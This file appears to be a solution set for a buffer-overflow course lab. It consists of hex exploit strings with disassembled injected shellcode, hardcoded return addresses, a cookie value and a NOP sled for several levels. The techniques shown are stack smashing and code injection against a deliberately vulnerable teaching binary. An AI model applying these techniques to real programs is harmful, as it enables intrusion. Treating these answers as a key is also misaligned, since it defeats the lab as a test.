00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 9b 91 04 08 /* 1.  36char + (0804919b) */


00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 50 91 04 08 00 00 00 00 a1 70 8b 29 /* 2.  36char + (08049150) + 4char + 298b70a1 */

00000000 <.text>:
   0:   b8 a1 70 8b 29          mov    $0x298b70a1,%eax
   5:   a3 24 b3 04 08          mov    %eax,0x804b324
   a:   68 03 91 04 08          push   $0x08049103
   f:   c3                      ret
b8 a1 70 8b 29 a3 24 b3 04 08 68 03 91 04 08 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 d0 33 68 55 /* code + 0~ + 0x556833d0 */

00000000 <.text>:
   0:   b8 a1 70 8b 29          mov    $0x298b70a1,%eax
   5:   68 35 8d 04 08          push   $0x08048d35
   a:   c3                      ret

0x55683410
b8 a1 70 8b 29 68 35 8d 04 08 c3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 10 34 68 55 d0 33 68 55

   0:   b8 a1 70 8b 29          mov    $0x298b70a1,%eax
   5:   89 e2                   mov    %esp,%edx
   7:   83 c2 18                add    $0x18,%edx
   a:   89 d5                   mov    %edx,%ebp
   c:   68 d1 8c 04 08          push   $0x8048cd1
  11:   c3                      ret

ebp 0x556833d0

0x556831d0
0x556831e0

516 + address
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 b8 a1 70 8b 29 89 e2 83 c2 18 89 d5 68 d1 8c 04 08 c3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 e0 32 68 55 /* goto address */